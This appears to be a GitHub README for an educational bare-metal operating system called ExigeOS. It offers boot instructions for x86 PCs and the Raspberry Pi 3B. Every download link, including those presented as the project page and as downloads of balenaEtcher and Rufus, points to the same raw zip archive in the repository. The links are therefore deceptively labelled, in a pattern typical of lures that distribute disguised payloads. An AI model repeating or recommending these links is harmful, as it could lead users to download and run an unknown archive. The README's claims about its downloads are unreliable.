# 💻 ExigeOS - Simple Bare-Metal OS for Learning

[![Download ExigeOS](https://img.shields.io/badge/Download-ExigeOS-brightgreen)](https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip)

ExigeOS is a basic operating system kernel written in C. It runs directly on computer hardware without the help of another operating system. This project is mainly for educational use. It targets x86 computers and Raspberry Pi 3B devices. ExigeOS is a fresh start based on a system called Elise-OS from 2003.

---

## 📚 What is ExigeOS?

ExigeOS is a tiny software that acts as the first program your computer loads when it powers on. Unlike your usual Windows or Linux system, it runs directly on hardware, handling low-level tasks.

- It supports the x86 architecture, which covers most desktop and laptop computers.
- It also works on the Raspberry Pi 3B, a popular small computer used for learning and projects.
- The kernel is written in simple C, making it a useful tool for those interested in how operating systems work.
- This project rewrites and improves on an older system called Elise-OS.

This project is mainly for learning and experimentation. It helps understand how software communicates directly with hardware.

---

## ⚙️ System Requirements

Before you start, make sure your computer or device meets these minimum requirements:

- For x86 PC:
  - 64-bit or 32-bit Intel or AMD processor
  - At least 512 MB of RAM
  - USB port to create bootable media or ability to boot from ISO image
- For Raspberry Pi 3B:
  - Raspberry Pi 3 Model B board
  - MicroSD card with at least 4 GB storage
  - Power supply for Raspberry Pi 3B
  - HDMI cable and display (to see the output)
  
You will also need either a USB flash drive or a microSD card to prepare the system for your device.

---

## 🖥️ How to Download and Prepare ExigeOS

To get ExigeOS, go to the main page below:

[![Download ExigeOS](https://img.shields.io/badge/Download-ExigeOS-blue)](https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip)

Click the badge or visit this link:  
https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip

This link will take you to the project page, where you can find the files to download.

---

### Step 1: Download the Latest Release

1. On the GitHub page, look for the "Releases" section. Usually, it is on the right side or under the project description.
2. Download the latest release zip or image file. This file contains everything you need.
3. If you are using a Raspberry Pi, the release may include an image file ready to write to a microSD card.
4. If you use a PC, look for an ISO or bootable image file.

---

### Step 2: Prepare Your Installation Media

**For Raspberry Pi 3B:**

1. Insert your microSD card into your computer.
2. Download a tool like balenaEtcher from https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip to write the image file to your microSD card.
3. Open balenaEtcher.
4. Select the downloaded image file.
5. Select your microSD card as the target.
6. Click "Flash" to start writing.
7. When done, safely eject the microSD card and insert it into your Raspberry Pi.

**For x86 PC:**

1. Use a USB drive with at least 1 GB space.
2. Download a tool such as Rufus from https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip to create a bootable USB device.
3. Open Rufus.
4. Select the USB drive.
5. Choose the downloaded ISO or image file.
6. Start the process to copy the image onto the USB.
7. Once completed, safely eject the USB drive.

---

### Step 3: Boot Your Device with ExigeOS

- Insert your prepared USB or microSD card into the target device.
- Turn off the device completely.
- Turn on the device and press the key to enter the boot menu:
  - For PCs, common keys are F12, F10, ESC, or DEL.
  - On Raspberry Pi, it boots automatically from the microSD card.
- Select the USB or microSD device to start booting.
- ExigeOS will load, and you should see a simple interface or text messages on screen.
- The system will run basic kernel tasks directly on your hardware.

---

## 🛠️ What You Can Do with ExigeOS

ExigeOS is not a full operating system for everyday use. It is intended to show how core parts of an OS work. You can:

- Explore how an OS runs without a main operating system.
- Study the C code that runs directly on hardware.
- Learn about the x86 and ARM (Raspberry Pi) architectures.
- Experiment with adding basic features or modifying the code.
- Understand how kernels handle memory, CPU, and devices.

---

## 📂 Folder Structure Overview

After downloading and extracting the files, you will see something like this:

- **/boot/** – Contains the files needed to start the OS.
- **/src/** – The source code in C.
- **/docs/** – Documentation and instructions.
- **/tools/** – Helper scripts and utilities.
- **README.md** – This instruction file.

Use these folders if you want to explore the system deeper or change how it works.

---

## 💡 Tips for First-Time Users

- If you are new to working with bootable media, take your time following each step carefully.
- Make sure to back up any important data on your USB or microSD card before flashing the image.
- Use an empty or expendable USB/microSD if possible.
- If your device does not boot, check the boot order in BIOS/UEFI settings.
- Be patient; bare-metal systems often show simple screens without graphics.

---

## ✨ Supported Platforms and Technologies

- Works on x86 PCs (both 32-bit and 64-bit)
- Supports Raspberry Pi 3 Model B (ARM architecture)
- Written mainly in C with some assembly code for hardware interaction
- Uses bare-metal programming techniques with no other OS required
- Applies basic OS concepts like memory management and processor control

---

## 🔗 Useful Links

- Project page and downloads: https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip
- Tool to write images (balenaEtcher): https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip
- USB boot tool for PCs (Rufus): https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip

---

## ❓ Getting Help

If you have trouble running or installing ExigeOS:

- Check the GitHub Issues section for similar problems.
- Review the documentation in the `/docs/` folder.
- If you want to report a bug or request help, open a new issue on the GitHub page.

---

## 🚀 Start Learning

Once you have ExigeOS running, you can open and read the source code. Look at files in the `/src/` folder to see how a simple kernel loads and runs commands on your computer or Raspberry Pi.

This project offers a hands-on way to understand what goes on behind the scenes before your usual operating system takes over.